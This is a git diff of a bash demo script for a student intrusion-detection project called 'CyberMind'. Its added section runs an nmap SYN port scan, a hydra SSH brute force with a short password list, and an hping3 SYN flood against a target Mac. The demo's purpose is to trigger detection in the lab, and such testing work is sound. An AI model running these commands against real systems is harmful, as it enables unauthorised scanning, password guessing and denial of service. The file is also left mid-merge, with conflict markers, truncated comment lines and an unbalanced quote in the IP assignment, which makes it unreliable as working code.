@@ -1,8 +1,17 @@
 #!/bin/bash
 # ╔══════════════════════════════════════════════════════════════════════════╗
+<<<<<<< Updated upstream
 # ║  CyberMind Demo — Kali Linux Attack Script                              ║
 # ║  Run this FROM the Kali machine against the Mac running CyberMind.      ║
 # ║  This triggers real traffic that the RF model will classify.            ║
+=======
+# ║  CyberMind Demo — Parrot OS / Kali Linux Attack Script (UTM)             ║
+# ║                                Nmap SYN Po                                          ║
+# ║  HOW TO USE:                                                             ║
+# ║  1. On your Mac: click "Start Scan" in the dashboard                     ║
+# ║  2. Within 3 seconds: run this script on Parrot OS / Kali               ║
+# ║  3. Watch the scan result change from SAFE → PORT SCAN / DDOS           ║
+>>>>>>> Stashed changes
 # ╚══════════════════════════════════════════════════════════════════════════╝
 #
 # SETUP:
@@ -19,6 +28,7 @@
 #
 # Each attack pauses 5 seconds so the professor can see detection in real-time.
 
+<<<<<<< Updated upstream
 set -e
 
 # ─── Config ──────────────────────────────────────────────────────────────────
@@ -29,13 +39,19 @@ if [[ -z "$MAC_IP" ]]; then
   echo "  bash kali_attack.sh"
   exit 1
 fi
+=======
+# ── Target MAC IP ─────────────────────────────────────────────────────────────
+MAC_IP="127.0.0.1"" 
+>>>>>>> Stashed changes
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
+BOLD='\033[1m'
 NC='\033[0m'
 
+<<<<<<< Updated upstream
 echo ""
 echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${RED}║  KALI LINUX ATTACK DEMO — Targeting: ${MAC_IP}           ║${NC}"
@@ -135,3 +151,53 @@ echo -e "${RED}║  3. Show Honeypot screen for captured connections            
 echo -e "${RED}║  4. Block the Kali IP from the Dashboard                    ║${NC}"
 echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
+=======
+echo -e "${RED}${BOLD}"
+echo -e "╔══════════════════════════════════════════════════════════════╗"
+echo -e "║  CYBERMIND DEMO — Parrot OS → Mac (${MAC_IP})          ║"
+echo -e "╚══════════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+echo -e "${YELLOW}⚡ Start the scan on your Mac dashboard NOW, then watch here.${NC}"
+echo ""
+
+# ─── Attack 1: rt Scan ────────────────────────────────────────────
+# Sends SYN packets to ports 1-1000. Scapy on Mac sees the SYN flood.
+echo -e "${CYAN}[1/3] Nmap SYN Port Scan → ${MAC_IP}${NC}"
+nmap -sS -p 1-1000 --min-rate 500 "$MAC_IP" 2>/dev/null \
+  || nmap -p 1-1000 "$MAC_IP" 2>/dev/null \
+  || echo "  (nmap not found — install with: sudo apt install nmap)"
+echo -e "${GREEN}  ✔ Port scan sent.${NC}"
+
+# Small gap between attacks
+sleep 2
+
+# ─── Attack 2: SSH Brute Force (Honeypot on port 2222) ───────────────────────
+# Sends rapid SSH connection attempts to CyberMind's honeypot.
+echo -e "${CYAN}[2/3] SSH Brute Force → ${MAC_IP}:2222${NC}"
+echo -e "root\nadmin\npassword\n123456\nadmin123\ntest\nguest\nqwerty" > /tmp/cm_wordlist.txt
+hydra -l admin -P /tmp/cm_wordlist.txt "ssh://${MAC_IP}:2222" -t 8 -f 2>/dev/null \
+  || echo "  (hydra not found — install with: sudo apt install hydra)"
+rm -f /tmp/cm_wordlist.txt
+echo -e "${GREEN}  ✔ Brute force sent. Check Honeypot screen.${NC}"
+
+# Small gap between attacks
+sleep 2
+
+# ─── Attack 3: SYN Flood DDoS ────────────────────────────────────────────────
+# Sends a flood of SYN packets to port 8080 for 15 seconds.
+# This generates the most traffic and is the most visible in the classifier.
+echo -e "${CYAN}[3/3] SYN Flood (DDoS) → ${MAC_IP}:8080 for 15 seconds${NC}"
+timeout 15 hping3 -S --flood -p 8080 "$MAC_IP" 2>/dev/null \
+  || timeout 15 hping3 -S -p 8080 "$MAC_IP" 2>/dev/null \
+  || echo "  (hping3 not found — install with: sudo apt install hping3)"
+echo -e "${GREEN}  ✔ DDoS flood sent.${NC}"
+
+echo ""
+echo -e "${RED}${BOLD}"
+echo -e "╔══════════════════════════════════════════════════════════════╗"
+echo -e "║  ALL ATTACKS SENT!                                           ║"
+echo -e "║  → Go back to Mac Dashboard and click 'Start Scan'          ║"
+echo -e "║  → You should see PORT SCAN and DDOS detected               ║"
+echo -e "╚══════════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+>>>>>>> Stashed changes
